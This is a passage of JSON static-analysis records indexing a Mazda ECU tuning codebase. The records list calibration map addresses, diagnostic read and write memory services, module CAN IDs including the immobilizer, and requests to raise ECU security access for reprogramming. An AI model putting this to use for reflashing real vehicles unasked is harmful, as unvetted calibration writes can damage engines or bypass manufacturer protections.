{"type": "function", "name": "disconnect", "line": 539}, {"type": "function", "name": "__init__", "line": 554}, {"type": "function", "name": "__init__", "line": 559}, {"type": "function", "name": "__init__", "line": 564}, {"type": "function", "name": "calculate_checksum", "line": 586}, {"type": "function", "name": "bytes_to_uint8", "line": 602}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "mds6", "line": null}, {"type": "import", "module": "mds8", "line": null}, {"type": "import", "module": "mds9", "line": null}, {"type": "import", "module": "mds14", "line": null}, {"type": "import", "module": "mazda_ecu_core", "line": null}, {"type": "import", "module": "advanced_ecu_access", "line": null}, {"type": "import", "module": "mazda_calibration_manager", "line": null}, {"type": "import", "module": "mazda_ecu_core", "line": null}, {"type": "import", "module": "advanced_ecu_access", "line": null}, {"type": "import", "module": "mazda_ecu_core", "line": null}, {"type": "import", "module": "advanced_ecu_access", "line": null}, {"type": "import", "module": "mazda_calibration_manager", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "J2534Interface,", "line": null}, {"type": "import", "module": "failed", "line": null}, {"type": "import", "module": "MazdaCalibrationService,", "line": null}, {"type": "import", "module": "failed", "line": null}, {"type": "import", "module": "MazdaChecksumCalculator,", "line": null}, {"type": "import", "module": "failed", "line": null}, {"type": "import", "module": "MazdaDataConverter", "line": null}, {"type": "import", "module": "failed", "line": null}, {"type": "import", "module": "MazdaECUCore,", "line": null}, {"type": "import", "module": "AdvancedECUAccess,", "line": null}, {"type": "import", "module": "MazdaCalibrationManager,", "line": null}, {"type": "import", "module": "ECUConnection,", "line": null}, {"type": "import", "module": "SecurityLevel", "line": null}, {"type": "import", "module": "ECUConnection,", "line": null}, {"type": "import", "module": "SecurityLevel", "line": null}, {"type": "import", "module": "CalibrationFile,", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "types", "line": null}, {"type": "import", "module": "types", "line": null}, {"type": "import", "module": "types", "line": null}, {"type": "import", "module": "types", "line": null}], "components_found": [{"type": "class", "name": "IntegrationTest", "line": 26}, {"type": "class", "name": "J2534Protocol", "line": 522}, {"type": "class", "name": "J2534Interface", "line": 527}, {"type": "class", "name": "MapAdjustment", "line": 553}, {"type": "class", "name": "CalibrationValidationResult", "line": 558}, {"type": "class", "name": "MazdaCalibrationService", "line": 563}, {"type": "class", "name": "ChecksumType", "line": 579}, {"type": "class", "name": "MazdaChecksumCalculator", "line": 585}, {"type": "class", "name": "MazdaDataConverter", "line": 600}], "algorithms": [{"type": "algorithm_function", "line": 586, "content": "def calculate_checksum(self, data, checksum_type, start_address=0, length=0):"}], "protocols": [{"type": "protocol", "line": 86, "protocol": "J2534", "content": "from mds6 import J2534Interface, J2534Protocol"}, {"type": "protocol", "line": 87, "protocol": "J2534", "content": "logger.info(\"\u2713 MDS6 J2534 interface imported successfully\")"}, {"type": "protocol", "line": 130, "protocol": "J2534", "content": "assert CommunicationMethod.J2534_PASSTHRU in self.ecu_core.supported_methods"}, {"type": "protocol", "line": 221, "protocol": "J2534", "content": "from mazda_ecu_core import ECUConnection, CommunicationMethod, J2534Protocol"}, {"type": "protocol", "line": 224, "protocol": "J2534", "content": "method=CommunicationMethod.J2534_PASSTHRU,"}, {"type": "protocol", "line": 226, "protocol": "J2534", "content": "protocol=J2534Protocol.ISO15765,"}, {"type": "protocol", "line": 237, "protocol": "J2534", "content": "assert status['method'] == 'J2534_PASSTHRU'"}, {"type": "protocol", "line": 387, "protocol": "J2534", "content": "from mazda_ecu_core import ECUConnection, CommunicationMethod, J2534Protocol"}, {"type": "protocol", "line": 389, "protocol": "J2534", "content": "method=CommunicationMethod.J2534_PASSTHRU,"}, {"type": "protocol", "line": 391, "protocol": "J2534", "content": "protocol=J2534Protocol.ISO15765,"}, {"type": "protocol", "line": 451, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFA000,"}, {"type": "protocol", "line": 452, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x800,"}, {"type": "protocol", "line": 471, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFB000,"}, {"type": "protocol", "line": 472, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x800,"}, {"type": "protocol", "line": 491, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFBC00,"}, {"type": "protocol", "line": 492, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x400,"}, {"type": "protocol", "line": 510, "protocol": "0x[0-9A-Fa-f]+", "content": "checksums={'ignition_timing_base': 0x12345678, 'fuel_injection_base': 0x87654321, 'boost_target': 0x"}, {"type": "protocol", "line": 522, "protocol": "J2534", "content": "class J2534Protocol:"}, {"type": "protocol", "line": 525, "protocol": "KWP", "content": "KWP2000 = 3"}, {"type": "protocol", "line": 527, "protocol": "J2534", "content": "class J2534Interface:"}, {"type": "protocol", "line": 542, "protocol": "J2534", "content": "mds6.J2534Interface = J2534Interface"}, {"type": "protocol", "line": 543, "protocol": "J2534", "content": "mds6.J2534Protocol = J2534Protocol"}, {"type": "protocol", "line": 587, "protocol": "0x[0-9A-Fa-f]+", "content": "return 0x12345678"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "Tests complete data flow: ECU \u2192 Security \u2192 Calibration \u2192 Write Back"}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "self.ecu_core = None"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "self.test_ecu_core_initialization,"}, {"type": "hardware", "line": 45, "hardware": "vehicle", "content": "self.test_mock_vehicle_connection,"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "self.test_security_access_simulation,"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "def test_ecu_core_initialization(self) -> bool:"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "\"\"\"Test ECU core initialization\"\"\""}, {"type": "hardware", "line": 123, "hardware": "ECU", "content": "from mazda_ecu_core import MazdaECUCore, CommunicationMethod"}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "self.ecu_core = MazdaECUCore()"}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "assert self.ecu_core is not None"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "assert len(self.ecu_core.mazda_ecus) > 0"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "assert CommunicationMethod.J2534_PASSTHRU in self.ecu_core.supported_methods"}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "available_interfaces = self.ecu_core.detect_available_interfaces()"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "logger.info(\"\u2713 ECU Core initialized successfully\")"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "logger.error(f\"ECU core initialization test failed: {e}\")"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "from advanced_ecu_access import AdvancedECUAccess, SecurityLevel"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "if not self.ecu_core:"}, {"type": "hardware", "line": 149, "hardware": "ECU", "content": "logger.error(\"ECU core not initialized\")"}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "self.advanced_access = AdvancedECUAccess(self.ecu_core)"}, {"type": "hardware", "line": 156, "hardware": "ECU", "content": "assert len(self.advanced_access.security_algorithms) > 0"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": "assert self.advanced_access.current_security_level == SecurityLevel.LEVEL_1"}, {"type": "hardware", "line": 160, "hardware": "ECU", "content": "logger.info(\"\u2713 Advanced ECU Access initialized successfully\")"}, {"type": "hardware", "line": 172, "hardware": "ECU", "content": "if not self.ecu_core:"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "logger.error(\"ECU core not initialized\")"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "self.ecu_core,"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "assert self.calibration_manager.ecu_core is self.ecu_core"}, {"type": "hardware", "line": 199, "hardware": "ECU", "content": "assert self.advanced_access.ecu_core is self.ecu_core"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "status = self.ecu_core.get_connection_status()"}, {"type": "hardware", "line": 217, "hardware": "vehicle", "content": "def test_mock_vehicle_connection(self) -> bool:"}, {"type": "hardware", "line": 218, "hardware": "vehicle", "content": "\"\"\"Test mock vehicle connection\"\"\""}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "from mazda_ecu_core import ECUConnection, CommunicationMethod, J2534Protocol"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "mock_connection = ECUConnection("}, {"type": "hardware", "line": 229, "hardware": "vehicle", "content": "vehicle_info={'vin': 'JM1BL3VP8A1300001', 'calibration_id': 'MZRDISI2011'}"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "self.ecu_core.current_connection = mock_connection"}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "status = self.ecu_core.get_connection_status()"}, {"type": "hardware", "line": 239, "hardware": "vehicle", "content": "logger.info(\"\u2713 Mock vehicle connection test passed\")"}, {"type": "hardware", "line": 243, "hardware": "vehicle", "content": "logger.error(f\"Mock vehicle connection test failed: {e}\")"}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "def test_security_access_simulation(self) -> bool:"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "\"\"\"Test security access simulation\"\"\""}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "from advanced_ecu_access import SecurityLevel"}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "assert self.advanced_access.current_security_level == SecurityLevel.LEVEL_1"}, {"type": "hardware", "line": 255, "hardware": "ECU", "content": "self.advanced_access.current_security_level = SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "assert self.advanced_access.current_security_level == SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 263, "hardware": "ECU", "content": "assert self.advanced_access.current_security_level >= int(region_info['access_level'].split('_')[-1]"}, {"type": "hardware", "line": 265, "hardware": "ECU", "content": "logger.info(\"\u2713 Security access simulation test passed\")"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "logger.error(f\"Security access simulation test failed: {e}\")"}, {"type": "hardware", "line": 282, "hardware": "vehicle", "content": "assert 'vehicle_info' in summary"}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "new_calibration_manager = MazdaCalibrationManager(self.ecu_core, self.advanced_access)"}, {"type": "hardware", "line": 382, "hardware": "ECU", "content": "assert self.ecu_core is not None"}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "from mazda_ecu_core import ECUConnection, CommunicationMethod, J2534Protocol"}, {"type": "hardware", "line": 388, "hardware": "ECU", "content": "mock_connection = ECUConnection("}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "vehicle_info={'vin': 'JM1BL3VP8A1300001', 'calibration_id': 'MZRDISI2011'}"}, {"type": "hardware", "line": 396, "hardware": "ECU", "content": "self.ecu_core.current_connection = mock_connection"}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "from advanced_ecu_access import SecurityLevel"}, {"type": "hardware", "line": 400, "hardware": "ECU", "content": "self.advanced_access.current_security_level = SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 425, "hardware": "ECU", "content": "new_manager = MazdaCalibrationManager(self.ecu_core, self.advanced_access)"}, {"type": "hardware", "line": 508, "hardware": "vehicle", "content": "vehicle_info={'vin': 'JM1BL3VP8A1300001', 'calibration_id': 'MZRDISI2011'},"}], "security_logic": [{"type": "security_pattern", "line": 46, "pattern": "security_access", "content": "self.test_security_access_simulation,"}, {"type": "security_pattern", "line": 80, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 81, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 81, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 156, "pattern": "algorithm", "content": "assert len(self.advanced_access.security_algorithms) > 0"}, {"type": "security_pattern", "line": 246, "pattern": "security_access", "content": "def test_security_access_simulation(self) -> bool:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mazda_calibration_manager.py", "lines_read": 1029, "features_found": [{"type": "function", "name": "__init__", "line": 86}, {"type": "function", "name": "_initialize_calibration_definitions", "line": 103}, {"type": "function", "name": "read_full_calibration", "line": 241}, {"type": "function", "name": "_read_calibration_map", "line": 309}, {"type": "function", "name": "_read_memory_by_address", "line": 359}, {"type": "function", "name": "_parse_map_data", "line": 378}, {"type": "function", "name": "_parse_axis_values", "line": 402}, {"type": "function", "name": "_parse_map_values", "line": 429}, {"type": "function", "name": "_calculate_map_checksum", "line": 471}, {"type": "function", "name": "_map_to_raw_data", "line": 489}, {"type": "function", "name": "modify_calibration_map", "line": 529}, {"type": "function", "name": "_apply_offset_adjustment", "line": 582}, {"type": "function", "name": "_apply_scaling_adjustment", "line": 597}, {"type": "function", "name": "_apply_interpolation_adjustment", "line": 612}, {"type": "function", "name": "_apply_custom_values", "line": 627}, {"type": "function", "name": "_find_nearest_axis_index", "line": 639}, {"type": "function", "name": "_validate_calibration_map", "line": 646}, {"type": "function", "name": "write_calibration_to_ecu", "line": 697}, {"type": "function", "name": "_write_memory_by_address", "line": 762}, {"type": "function", "name": "_update_map_checksum", "line": 782}, {"type": "function", "name": "_deep_copy_calibration", "line": 805}, {"type": "function", "name": "generate_performance_tune", "line": 843}, {"type": "function", "name": "get_calibration_summary", "line": 894}, {"type": "function", "name": "save_calibration_to_file", "line": 929}, {"type": "function", "name": "load_calibration_from_file", "line": 975}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "mds8", "line": null}, {"type": "import", "module": "mds4", "line": null}, {"type": "import", "module": "mds9", "line": null}, {"type": "import", "module": "mds14", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "mds_compatibility", "line": null}, {"type": "import", "module": "MazdaCalibrationService,", "line": null}, {"type": "import", "module": "MazdaCalibrationDatabase", "line": null}, {"type": "import", "module": "MazdaChecksumCalculator", "line": null}, {"type": "import", "module": "MazdaDataConverter", "line": null}], "components_found": [{"type": "class", "name": "CalibrationType", "line": 32}, {"type": "class", "name": "CalibrationStatus", "line": 43}, {"type": "class", "name": "CalibrationMap", "line": 52}, {"type": "class", "name": "CalibrationFile", "line": 71}, {"type": "class", "name": "MazdaCalibrationManager", "line": 80}], "algorithms": [{"type": "algorithm_function", "line": 471, "content": "def _calculate_map_checksum(self, calibration_map: CalibrationMap) -> int:"}], "protocols": [{"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFA000,"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x800,"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFA800,"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x800,"}, {"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFB000,"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x800,"}, {"type": "protocol", "line": 147, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFB800,"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x400,"}, {"type": "protocol", "line": 160, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFBC00,"}, {"type": "protocol", "line": 161, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x400,"}, {"type": "protocol", "line": 173, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFC000,"}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x200,"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFC200,"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x400,"}, {"type": "protocol", "line": 199, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFC600,"}, {"type": "protocol", "line": 200, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x400,"}, {"type": "protocol", "line": 212, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFCA00,"}, {"type": "protocol", "line": 213, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x100,"}, {"type": "protocol", "line": 225, "protocol": "0x[0-9A-Fa-f]+", "content": "'address': 0xFFCB00,"}, {"type": "protocol", "line": 226, "protocol": "0x[0-9A-Fa-f]+", "content": "'size': 0x100,"}, {"type": "protocol", "line": 367, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x23, payload)"}, {"type": "protocol", "line": 369, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x63:"}, {"type": "protocol", "line": 521, "protocol": "0x[0-9A-Fa-f]+", "content": "raw_data.append(0x00)"}, {"type": "protocol", "line": 771, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x3D, payload)"}, {"type": "protocol", "line": 773, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x7D:"}, {"type": "protocol", "line": 774, "protocol": "0x[0-9A-Fa-f]+", "content": "return response[1] == 0x00"}, {"type": "protocol", "line": 789, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address = 0xFFFFF0  # Checksum area"}], "hardware_assumptions": [{"type": "hardware", "line": 6, "hardware": "ECU", "content": "Integrates with ECU core and advanced access modules"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "SECURITY_LOCKED = 5"}, {"type": "hardware", "line": 73, "hardware": "vehicle", "content": "vehicle_info: Dict[str, str]"}, {"type": "hardware", "line": 86, "hardware": "ECU", "content": "def __init__(self, ecu_core, advanced_access=None):"}, {"type": "hardware", "line": 87, "hardware": "ECU", "content": "self.ecu_core = ecu_core"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "Read complete calibration from ECU"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "logger.info(\"Reading full calibration from ECU\")"}, {"type": "hardware", "line": 251, "hardware": "ECU", "content": "if not self.ecu_core.current_connection:"}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "logger.error(\"No ECU connection available\")"}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "vehicle_info = self.ecu_core.read_vehicle_identification()"}, {"type": "hardware", "line": 256, "hardware": "vehicle", "content": "vehicle_info = self.ecu_core.read_vehicle_identification()"}, {"type": "hardware", "line": 257, "hardware": "vehicle", "content": "if not vehicle_info:"}, {"type": "hardware", "line": 258, "hardware": "vehicle", "content": "logger.error(\"Failed to read vehicle information\")"}, {"type": "hardware", "line": 289, "hardware": "vehicle", "content": "vehicle_info=vehicle_info,"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "\"\"\"Read individual calibration map from ECU\"\"\""}, {"type": "hardware", "line": 367, "hardware": "ECU", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x23, payload)"}, {"type": "hardware", "line": 642, "hardware": "ABS", "content": "return min(range(len(axis)), key=lambda i: abs(axis[i] - value))"}, {"type": "hardware", "line": 667, "hardware": "ABS", "content": "max_gradient = np.max(np.abs(gradients))"}, {"type": "hardware", "line": 697, "hardware": "ECU", "content": "def write_calibration_to_ecu(self) -> bool:"}, {"type": "hardware", "line": 699, "hardware": "ECU", "content": "Write modified calibration back to ECU"}, {"type": "hardware", "line": 713, "hardware": "ECU", "content": "logger.info(f\"Writing {len(self.modified_maps)} modified maps to ECU\")"}, {"type": "hardware", "line": 717, "hardware": "ECU", "content": "if self.advanced_access.current_security_level < 3:"}, {"type": "hardware", "line": 718, "hardware": "ECU", "content": "logger.info(\"Requesting programming security access\")"}, {"type": "hardware", "line": 719, "hardware": "ECU", "content": "if not self.advanced_access.request_security_access(SecurityLevel.LEVEL_3):"}, {"type": "hardware", "line": 720, "hardware": "ECU", "content": "logger.error(\"Failed to obtain programming security access\")"}, {"type": "hardware", "line": 755, "hardware": "ECU", "content": "logger.info(\"Calibration successfully written to ECU\")"}, {"type": "hardware", "line": 759, "hardware": "ECU", "content": "logger.error(f\"Error writing calibration to ECU: {e}\")"}, {"type": "hardware", "line": 771, "hardware": "ECU", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x3D, payload)"}, {"type": "hardware", "line": 831, "hardware": "vehicle", "content": "vehicle_info=calibration.vehicle_info.copy(),"}, {"type": "hardware", "line": 901, "hardware": "vehicle", "content": "'vehicle_info': self.current_calibration.vehicle_info,"}, {"type": "hardware", "line": 938, "hardware": "vehicle", "content": "'vehicle_info': self.current_calibration.vehicle_info,"}, {"type": "hardware", "line": 1006, "hardware": "vehicle", "content": "vehicle_info=calibration_dict['vehicle_info'],"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 642, "pattern": "key", "content": "return min(range(len(axis)), key=lambda i: abs(axis[i] - value))"}, {"type": "security_pattern", "line": 719, "pattern": "security_access", "content": "if not self.advanced_access.request_security_access(SecurityLevel.LEVEL_3):"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mazda_ecu_core.py", "lines_read": 450, "features_found": [{"type": "function", "name": "__init__", "line": 48}, {"type": "function", "name": "detect_available_interfaces", "line": 71}, {"type": "function", "name": "connect_to_vehicle", "line": 128}, {"type": "function", "name": "_connect_j2534", "line": 158}, {"type": "function", "name": "_connect_can", "line": 193}, {"type": "function", "name": "_connect_obd", "line": 218}, {"type": "function", "name": "disconnect", "line": 246}, {"type": "function", "name": "send_diagnostic_message", "line": 272}, {"type": "function", "name": "_send_j2534_diagnostic", "line": 316}, {"type": "function", "name": "_send_can_diagnostic", "line": 333}, {"type": "function", "name": "_send_obd_diagnostic", "line": 352}, {"type": "function", "name": "read_vehicle_identification", "line": 372}, {"type": "function", "name": "get_connection_status", "line": 397}, {"type": "function", "name": "test_communication", "line": 426}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "mds6", "line": null}, {"type": "import", "module": "mds12", "line": null}, {"type": "import", "module": "mds13", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "mds_compatibility", "line": null}, {"type": "import", "module": "J2534Interface", "line": null}, {"type": "import", "module": "MazdaCANInterface,", "line": null}, {"type": "import", "module": "MazdaOBDInterface,", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "socket", "line": null}, {"type": "import", "module": "serial.tools.list_ports", "line": null}], "components_found": [{"type": "class", "name": "CommunicationMethod", "line": 26}, {"type": "class", "name": "ECUConnection", "line": 33}, {"type": "class", "name": "MazdaECUCore", "line": 42}], "algorithms": [], "protocols": [{"type": "protocol", "line": 16, "protocol": "J2534", "content": "from mds6 import J2534Interface"}, {"type": "protocol", "line": 17, "protocol": "CAN", "content": "from mds12 import MazdaCANInterface, CANFrame, CANFrameType"}, {"type": "protocol", "line": 18, "protocol": "OBD", "content": "from mds13 import MazdaOBDInterface, OBDProtocol"}, {"type": "protocol", "line": 21, "protocol": "J2534", "content": "J2534Error = mds_compatibility.J2534Error"}, {"type": "protocol", "line": 22, "protocol": "J2534", "content": "J2534Protocol = mds_compatibility.J2534Protocol"}, {"type": "protocol", "line": 28, "protocol": "J2534", "content": "J2534_PASSTHRU = 1"}, {"type": "protocol", "line": 29, "protocol": "CAN", "content": "CAN_DIRECT = 2"}, {"type": "protocol", "line": 30, "protocol": "OBD", "content": "OBD_SERIAL = 3"}, {"type": "protocol", "line": 37, "protocol": "OBD", "content": "protocol: Union[J2534Protocol, OBDProtocol]"}, {"type": "protocol", "line": 37, "protocol": "J2534", "content": "protocol: Union[J2534Protocol, OBDProtocol]"}, {"type": "protocol", "line": 49, "protocol": "J2534", "content": "self.j2534_interface = J2534Interface()"}, {"type": "protocol", "line": 50, "protocol": "CAN", "content": "self.can_interface = MazdaCANInterface()"}, {"type": "protocol", "line": 51, "protocol": "OBD", "content": "self.obd_interface = MazdaOBDInterface()"}, {"type": "protocol", "line": 55, "protocol": "J2534", "content": "CommunicationMethod.J2534_PASSTHRU,"}, {"type": "protocol", "line": 56, "protocol": "CAN", "content": "CommunicationMethod.CAN_DIRECT,"}, {"type": "protocol", "line": 57, "protocol": "OBD", "content": "CommunicationMethod.OBD_SERIAL"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine': {'tx': 0x7E0, 'rx': 0x7E8, 'name': 'Engine ECU'},"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "'transmission': {'tx': 0x7E1, 'rx': 0x7E9, 'name': 'TCM'},"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': {'tx': 0x7E2, 'rx': 0x7EA, 'name': 'ABS Module'},"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "'bcm': {'tx': 0x7E6, 'rx': 0x7EE, 'name': 'Body Control'},"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': {'tx': 0x7E5, 'rx': 0x7ED, 'name': 'Immobilizer'}"}, {"type": "protocol", "line": 88, "protocol": "J2534", "content": "\"C:\\\\Program Files\\\\Mazda\\\\IDS\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 89, "protocol": "J2534", "content": "\"C:\\\\Program Files (x86)\\\\Mazda\\\\IDS\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 90, "protocol": "J2534", "content": "\"C:\\\\Windows\\\\System32\\\\J2534PassThru.dll\""}, {"type": "protocol", "line": 103, "protocol": "J2534", "content": "logger.debug(f\"J2534 detection error: {e}\")"}, {"type": "protocol", "line": 109, "protocol": "CAN", "content": "test_socket = socket.socket(socket.AF_CAN, socket.SOCK_RAW)"}, {"type": "protocol", "line": 144, "protocol": "J2534", "content": "if method == CommunicationMethod.J2534_PASSTHRU:"}, {"type": "protocol", "line": 146, "protocol": "CAN", "content": "elif method == CommunicationMethod.CAN_DIRECT:"}, {"type": "protocol", "line": 148, "protocol": "OBD", "content": "elif method == CommunicationMethod.OBD_SERIAL:"}, {"type": "protocol", "line": 158, "protocol": "J2534", "content": "def _connect_j2534(self, interface: str, protocol: J2534Protocol = J2534Protocol.ISO15765,"}, {"type": "protocol", "line": 160, "protocol": "J2534", "content": "\"\"\"Connect via J2534 Pass-Thru\"\"\""}, {"type": "protocol", "line": 164, "protocol": "J2534", "content": "logger.error(\"Failed to load J2534 library\")"}, {"type": "protocol", "line": 169, "protocol": "J2534", "content": "logger.error(\"Failed to connect J2534 device\")"}, {"type": "protocol", "line": 179, "protocol": "J2534", "content": "method=CommunicationMethod.J2534_PASSTHRU,"}, {"type": "protocol", "line": 186, "protocol": "J2534", "content": "logger.info(\"J2534 connection established\")"}, {"type": "protocol", "line": 190, "protocol": "J2534", "content": "logger.error(f\"J2534 connection error: {e}\")"}, {"type": "protocol", "line": 194, "protocol": "CAN", "content": "\"\"\"Connect via direct CAN interface\"\"\""}, {"type": "protocol", "line": 199, "protocol": "CAN", "content": "logger.error(\"Failed to connect CAN interface\")"}, {"type": "protocol", "line": 204, "protocol": "CAN", "content": "method=CommunicationMethod.CAN_DIRECT,"}, {"type": "protocol", "line": 206, "protocol": "CAN", "content": "protocol=OBDProtocol.ISO_15765_4_CAN_11B_500K,"}, {"type": "protocol", "line": 206, "protocol": "OBD", "content": "protocol=OBDProtocol.ISO_15765_4_CAN_11B_500K,"}, {"type": "protocol", "line": 211, "protocol": "CAN", "content": "logger.info(\"CAN connection established\")"}, {"type": "protocol", "line": 215, "protocol": "CAN", "content": "logger.error(f\"CAN connection error: {e}\")"}, {"type": "protocol", "line": 219, "protocol": "OBD", "content": "protocol: OBDProtocol = OBDProtocol.AUTO) -> bool:"}, {"type": "protocol", "line": 220, "protocol": "OBD", "content": "\"\"\"Connect via OBD-II serial interface\"\"\""}, {"type": "protocol", "line": 227, "protocol": "OBD", "content": "logger.error(\"Failed to connect OBD interface\")"}, {"type": "protocol", "line": 232, "protocol": "OBD", "content": "method=CommunicationMethod.OBD_SERIAL,"}, {"type": "protocol", "line": 239, "protocol": "OBD", "content": "logger.info(\"OBD connection established\")"}, {"type": "protocol", "line": 243, "protocol": "OBD", "content": "logger.error(f\"OBD connection error: {e}\")"}, {"type": 